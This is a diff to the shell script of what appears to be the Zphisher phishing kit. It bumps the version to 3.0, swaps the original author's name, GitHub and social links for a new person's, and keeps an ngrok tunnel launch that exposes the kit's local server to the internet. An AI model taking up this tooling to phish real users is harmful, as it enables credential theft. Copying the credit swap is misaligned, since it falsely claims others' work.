@@ -76,7 +76,7 @@ banner() {
 		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
 		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
 		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : 2.2
+		${ORANGE}      |_|                ${RED}Version : 3.0
 
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by CLB-09 (Abdul.Basit.Kamboh)${WHITE}
 	EOF
@@ -88,7 +88,7 @@ banner_small() {
 		${BLUE}
 		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
 		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} 2.2
+		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} 3.0
 	EOF
 }
 
@@ -219,10 +219,10 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN}Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
-		${GREEN}Version  ${RED}:  ${ORANGE}2.2
+		${GREEN}Author   ${RED}:  ${ORANGE}ABDUL BASIT ${RED}[ ${ORANGE}CLB-09 ${RED}]
+		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/CLB-09
+		${GREEN}Social   ${RED}:  ${CYAN}https://facebook.com/A.BASIT.KAMBOH
+		${GREEN}Version  ${RED}:  ${ORANGE}3.0
 
 		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
 								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1 ${RESETBG}
@@ -308,7 +308,7 @@ start_ngrok() {
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
+        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Abdul Basit (https://github.com/CLB-09)
     else
         sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     fi
